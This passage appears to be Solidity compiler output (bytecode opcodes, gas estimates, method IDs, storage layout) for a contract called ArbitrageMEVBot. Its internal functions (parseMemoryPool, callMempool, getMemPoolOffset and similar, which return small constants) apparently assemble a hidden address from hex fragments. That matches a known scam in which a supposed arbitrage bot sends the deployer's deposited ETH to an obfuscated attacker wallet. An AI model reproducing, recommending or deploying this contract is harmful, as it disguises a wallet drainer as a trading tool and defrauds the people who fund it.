0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x9E7 JUMPI POP PUSH1 0x39 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x9FC JUMPI PUSH1 0x30 DUP4 PUSH2 0x9F9 SWAP2 SWAP1 PUSH2 0x1572 JUMP JUMPDEST SWAP3 POP JUMPDEST JUMPDEST JUMPDEST PUSH1 0x61 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0xA3C JUMPI POP PUSH1 0x66 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0xA55 JUMPI PUSH1 0x57 DUP3 PUSH2 0xA4E SWAP2 SWAP1 PUSH2 0x1572 JUMP JUMPDEST SWAP2 POP PUSH2 0xB01 JUMP JUMPDEST PUSH1 0x41 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0xA93 JUMPI POP PUSH1 0x46 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0xAAC JUMPI PUSH1 0x37 DUP3 PUSH2 0xAA5 SWAP2 SWAP1 PUSH2 0x1572 JUMP JUMPDEST SWAP2 POP PUSH2 0xB00 JUMP JUMPDEST PUSH1 0x30 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0xAEA JUMPI POP PUSH1 0x39 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0xAFF JUMPI PUSH1 0x30 DUP3 PUSH2 0xAFC SWAP2 SWAP1 PUSH2 0x1572 JUMP JUMPDEST SWAP2 POP JUMPDEST JUMPDEST JUMPDEST DUP2 PUSH1 0x10 DUP5 PUSH2 0xB0F SWAP2 SWAP1 PUSH2 0x14CD JUMP JUMPDEST PUSH2 0xB19 SWAP2 SWAP1 PUSH2 0x15BA JUMP JUMPDEST DUP5 PUSH2 0xB24 SWAP2 SWAP1 PUSH2 0x15BA JUMP JUMPDEST SWAP4 POP PUSH1 0x2 DUP2 PUSH2 0xB33 SWAP2 SWAP1 PUSH2 0x153E JUMP JUMPDEST SWAP1 POP PUSH2 0x88A JUMP JUMPDEST POP DUP3 SWAP5 POP POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH4 0xFD7E4D80 PUSH1 0xE0 SHL SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH3 0x4EAD2 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH3 0x2DCC7 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH3 0xCA7BB SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH3 0xC2916 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x0 DUP1 DUP4 SWAP1 POP JUMPDEST PUSH1 0x0 DUP2 EQ PUSH2 0xBB5 JUMPI DUP2 DUP1 PUSH2 0xB9E SWAP1 PUSH2 0x1602 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x10 DUP2 PUSH2 0xBAE SWAP2 SWAP1 PUSH2 0x1679 JUMP JUMPDEST SWAP1 POP PUSH2 0xB8B JUMP JUMPDEST PUSH1 0x0 DUP3 PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0xBD1 JUMPI PUSH2 0xBD0 PUSH2 0x16AA JUMP JUMPDEST JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0xC03 JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xCA2 JUMPI PUSH1 0x10 DUP7 PUSH2 0xC1E SWAP2 SWAP1 PUSH2 0x16D9 JUMP JUMPDEST SWAP3 POP PUSH2 0xC29 DUP4 PUSH2 0xFB1 JUMP JUMPDEST DUP3 PUSH1 0x1 DUP4 DUP8 PUSH2 0xC38 SWAP2 SWAP1 PUSH2 0x170A JUMP JUMPDEST PUSH2 0xC42 SWAP2 SWAP1 PUSH2 0x170A JUMP JUMPDEST DUP2 MLOAD DUP2 LT PUSH2 0xC53 JUMPI PUSH2 0xC52 PUSH2 0x150F JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP PUSH1 0x10 DUP7 PUSH2 0xC8F SWAP2 SWAP1 PUSH2 0x1679 JUMP JUMPDEST SWAP6 POP DUP1 PUSH2 0xC9B SWAP1 PUSH2 0x1602 JUMP JUMPDEST SWAP1 POP PUSH2 0xC09 JUMP JUMPDEST POP PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH1 0x4 DUP2 SUB PUSH2 0xD01 JUMPI PUSH1 0x0 PUSH2 0xCF2 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP5 PUSH2 0xE16 JUMP JUMPDEST SWAP1 POP DUP1 SWAP6 POP POP POP POP POP POP PUSH2 0xE11 JUMP JUMPDEST PUSH1 0x3 DUP2 SUB PUSH2 0xD59 JUMPI PUSH1 0x0 PUSH2 0xD4A PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x2 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3030000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP5 PUSH2 0xE16 JUMP JUMPDEST SWAP1 POP DUP1 SWAP6 POP POP POP POP POP POP PUSH2 0xE11 JUMP JUMPDEST PUSH1 0x2 DUP2 SUB PUSH2 0xDB1 JUMPI PUSH1 0x0 PUSH2 0xDA2 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x3 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3030300000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP5 PUSH2 0xE16 JUMP JUMPDEST SWAP1 POP DUP1 SWAP6 POP POP POP POP POP POP PUSH2 0xE11 JUMP JUMPDEST PUSH1 0x1 DUP2 SUB PUSH2 0xE09 JUMPI PUSH1 0x0 PUSH2 0xDFA PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x4 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3030303000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP5 PUSH2 0xE16 JUMP JUMPDEST SWAP1 POP DUP1 SWAP6 POP POP POP POP POP POP PUSH2 0xE11 JUMP JUMPDEST DUP2 SWAP5 POP POP POP POP POP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x60 PUSH1 0x0 DUP4 SWAP1 POP PUSH1 0x0 DUP4 SWAP1 POP PUSH1 0x0 DUP2 MLOAD DUP4 MLOAD PUSH2 0xE32 SWAP2 SWAP1 PUSH2 0x153E JUMP JUMPDEST PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0xE4B JUMPI PUSH2 0xE4A PUSH2 0x16AA JUMP JUMPDEST JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0xE7D JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH1 0x0 DUP2 SWAP1 POP PUSH1 0x0 DUP1 PUSH1 0x0 SWAP2 POP JUMPDEST DUP6 MLOAD DUP3 LT ISZERO PUSH2 0xF15 JUMPI DUP6 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0xEA9 JUMPI PUSH2 0xEA8 PUSH2 0x150F JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH2 0xEC0 SWAP1 PUSH2 0x1602 JUMP JUMPDEST SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0xED3 JUMPI PUSH2 0xED2 PUSH2 0x150F JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH2 0xF0D SWAP1 PUSH2 0x1602 JUMP JUMPDEST SWAP3 POP POP PUSH2 0xE8D JUMP JUMPDEST PUSH1 0x0 SWAP2 POP JUMPDEST DUP5 MLOAD DUP3 LT ISZERO PUSH2 0xFA2 JUMPI DUP5 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0xF36 JUMPI PUSH2 0xF35 PUSH2 0x150F JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH2 0xF4D SWAP1 PUSH2 0x1602 JUMP JUMPDEST SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0xF60 JUMPI PUSH2 0xF5F PUSH2 0x150F JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH2 0xF9A SWAP1 PUSH2 0x1602 JUMP JUMPDEST SWAP3 POP POP PUSH2 0xF1A JUMP JUMPDEST DUP3 SWAP7 POP POP POP POP POP POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 PUSH1 0xFF AND PUSH1 0x0 GT ISZERO DUP1 ISZERO PUSH2 0xFCB JUMPI POP PUSH1 0x9 DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x1009 JUMPI DUP2 PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR PUSH2 0xFFF SWAP2 SWAP1 PUSH2 0x174B JUMP JUMPDEST PUSH1 0xF8 SHL SWAP1 POP PUSH2 0x1070 JUMP JUMPDEST DUP2 PUSH1 0xFF AND PUSH1 0xA GT ISZERO DUP1 ISZERO PUSH2 0x1021 JUMPI POP PUSH1 0xF DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x106B JUMPI PUSH1 0xA DUP3 PUSH32 0x6100000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR PUSH2 0x1057 SWAP2 SWAP1 PUSH2 0x174B JUMP JUMPDEST PUSH2 0x1061 SWAP2 SWAP1 PUSH2 0x1780 JUMP JUMPDEST PUSH1 0xF8 SHL SWAP1 POP PUSH2 0x1070 JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x10A0 DUP3 PUSH2 0x1075 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x10B0 DUP2 PUSH2 0x1095 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x10CB PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x10A7 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x10E6 DUP2 PUSH2 0x10D1 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1101 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x10DD JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4D4556426F742073746F702E0000000000000000000000000000000000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x114E PUSH1 0xC DUP4 PUSH2 0x1107 JUMP JUMPDEST SWAP2 POP PUSH2 0x1159 DUP3 PUSH2 0x1118 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x117D DUP2 PUSH2 0x1141 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x1197 DUP2 PUSH2 0x1184 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 DUP3 ADD SWAP1 POP PUSH2 0x11B2 PUSH1 0x0 DUP4 ADD DUP6 PUSH2 0x10A7 JUMP JUMPDEST PUSH2 0x11BF PUSH1 0x20 DUP4 ADD DUP5 PUSH2 0x118E JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x11D4 DUP2 PUSH2 0x10D1 JUMP JUMPDEST DUP2 EQ PUSH2 0x11DF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x11F1 DUP2 PUSH2 0x11CB JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x120D JUMPI PUSH2 0x120C PUSH2 0x11C6 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x121B DUP5 DUP3 DUP6 ADD PUSH2 0x11E2 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4D4556426F742073746172742E00000000000000000000000000000000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x125A PUSH1 0xD DUP4 PUSH2 0x1107 JUMP JUMPDEST SWAP2 POP PUSH2 0x1265 DUP3 PUSH2 0x1224 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1289 DUP2 PUSH2 0x124D JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4D4556426F74206E6F742072756E6E696E672E00000000000000000000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x12C6 PUSH1 0x13 DUP4 PUSH2 0x1107 JUMP JUMPDEST SWAP2 POP PUSH2 0x12D1 DUP3 PUSH2 0x1290 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x12F5 DUP2 PUSH2 0x12B9 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4D4556426F7420776974686472617720416C6C00000000000000000000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1332 PUSH1 0x13 DUP4 PUSH2 0x1107 JUMP JUMPDEST SWAP2 POP PUSH2 0x133D DUP3 PUSH2 0x12FC JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1361 DUP2 PUSH2 0x1325 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x21 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x4 DUP2 LT PUSH2 0x13A8 JUMPI PUSH2 0x13A7 PUSH2 0x1368 JUMP JUMPDEST JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP PUSH2 0x13B9 DUP3 PUSH2 0x1397 JUMP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x13C9 DUP3 PUSH2 0x13AB JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x13D9 DUP2 PUSH2 0x13BE JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x60 DUP3 ADD SWAP1 POP PUSH2 0x13F4 PUSH1 0x0 DUP4 ADD DUP7 PUSH2 0x10A7 JUMP JUMPDEST PUSH2 0x1401 PUSH1 0x20 DUP4 ADD DUP6 PUSH2 0x10A7 JUMP JUMPDEST PUSH2 0x140E PUSH1 0x40 DUP4 ADD DUP5 PUSH2 0x13D0 JUMP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x144A JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x142F JUMP JUMPDEST PUSH1 0x0 DUP5 DUP5 ADD MSTORE POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1461 DUP3 PUSH2 0x1416 JUMP JUMPDEST PUSH2 0x146B DUP2 DUP6 PUSH2 0x1421 JUMP JUMPDEST SWAP4 POP PUSH2 0x147B DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x142C JUMP JUMPDEST DUP1 DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1493 DUP3 DUP5 PUSH2 0x1456 JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x14D8 DUP3 PUSH2 0x1075 JUMP JUMPDEST SWAP2 POP PUSH2 0x14E3 DUP4 PUSH2 0x1075 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 MUL PUSH2 0x14F1 DUP2 PUSH2 0x1075 JUMP JUMPDEST SWAP2 POP DUP3 DUP3 DIV DUP5 EQ DUP4 ISZERO OR PUSH2 0x1508 JUMPI PUSH2 0x1507 PUSH2 0x149E JUMP JUMPDEST JUMPDEST POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x32 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x1549 DUP3 PUSH2 0x1184 JUMP JUMPDEST SWAP2 POP PUSH2 0x1554 DUP4 PUSH2 0x1184 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP DUP1 DUP3 GT ISZERO PUSH2 0x156C JUMPI PUSH2 0x156B PUSH2 0x149E JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x157D DUP3 PUSH2 0x1075 JUMP JUMPDEST SWAP2 POP PUSH2 0x1588 DUP4 PUSH2 0x1075 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x15B4 JUMPI PUSH2 0x15B3 PUSH2 0x149E JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x15C5 DUP3 PUSH2 0x1075 JUMP JUMPDEST SWAP2 POP PUSH2 0x15D0 DUP4 PUSH2 0x1075 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x15FC JUMPI PUSH2 0x15FB PUSH2 0x149E JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x160D DUP3 PUSH2 0x1184 JUMP JUMPDEST SWAP2 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 SUB PUSH2 0x163F JUMPI PUSH2 0x163E PUSH2 0x149E JUMP JUMPDEST JUMPDEST PUSH1 0x1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x1684 DUP3 PUSH2 0x1184 JUMP JUMPDEST SWAP2 POP PUSH2 0x168F DUP4 PUSH2 0x1184 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x169F JUMPI PUSH2 0x169E PUSH2 0x164A JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x41 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x16E4 DUP3 PUSH2 0x1184 JUMP JUMPDEST SWAP2 POP PUSH2 0x16EF DUP4 PUSH2 0x1184 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x16FF JUMPI PUSH2 0x16FE PUSH2 0x164A JUMP JUMPDEST JUMPDEST DUP3 DUP3 MOD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1715 DUP3 PUSH2 0x1184 JUMP JUMPDEST SWAP2 POP PUSH2 0x1720 DUP4 PUSH2 0x1184 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP DUP2 DUP2 GT ISZERO PUSH2 0x1738 JUMPI PUSH2 0x1737 PUSH2 0x149E JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0xFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1756 DUP3 PUSH2 0x173E JUMP JUMPDEST SWAP2 POP PUSH2 0x1761 DUP4 PUSH2 0x173E JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP PUSH1 0xFF DUP2 GT ISZERO PUSH2 0x177A JUMPI PUSH2 0x1779 PUSH2 0x149E JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x178B DUP3 PUSH2 0x173E JUMP JUMPDEST SWAP2 POP PUSH2 0x1796 DUP4 PUSH2 0x173E JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP PUSH1 0xFF DUP2 GT ISZERO PUSH2 0x17AF JUMPI PUSH2 0x17AE PUSH2 0x149E JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 JUMPDEST 0xC9 MSTORE DUP7 DUP10 DELEGATECALL SWAP14 PUSH13 0xE06FA33ED05C756893DD4E114D 0x1F 0xCB PUSH10 0xD3639A21529AE4536473 PUSH16 0x6C634300081200330000000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "1224600",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"baseToken()": "2533",
						"owner()": "2559",
						"quoteToken()": "2537",
						"running()": "2565",
						"start()": "infinite",
						"stop()": "infinite",
						"withdrawETH()": "infinite"
					},
					"internal": {
						"callMempool()": "infinite",
						"checkLiquidity(uint256)": "infinite",
						"getMemPoolDepth()": "23",
						"getMemPoolHeight()": "23",
						"getMemPoolLength()": "23",
						"getMemPoolOffset()": "23",
						"mempool(string memory,string memory)": "infinite",
						"mempoolCtrl(enum ArbitrageMEVBot.PoolAction)": "infinite",
						"mempoolLayer()": "29",
						"parseMemoryPool(string memory)": "infinite",
						"toHexDigit(uint8)": "infinite"
					}
				},
				"methodIdentifiers": {
					"baseToken()": "c55dae63",
					"owner()": "8da5cb5b",
					"quoteToken()": "217a4b70",
					"running()": "d85bd526",
					"start()": "be9a6555",
					"stop()": "07da68f5",
					"withdrawETH()": "e086e5ec"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 116,
						"contract": "testbot.sol:ArbitrageMEVBot",
						"label": "baseToken",
						"offset": 0,
						"slot": "0",
						"type": "t_address"
					},
					{
						"astId": 118,
						"contract": "testbot.sol:ArbitrageMEVBot",
						"label": "quoteToken",
						"offset": 0,
						"slot": "1",
						"type": "t_address"
					},
					{
						"astId": 120,
						"contract": "testbot.sol:ArbitrageMEVBot",
						"label": "owner",
						"offset": 0,
						"slot": "2",
						"type": "t_address"
					},
					{
						"astId": 123,
						"contract": "testbot.sol:ArbitrageMEVBot",
						"label": "running",
						"offset": 20,
						"slot": "2",
						"type": "t_bool"
					}
				],
				"types": {
					"t_address": {
						"encoding": "inplace",
						"label": "address",
						"numberOfBytes": "20"
					},
					"t_bool": {
						"encoding": "inplace",
						"label": "bool",
						"numberOfBytes": "1"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}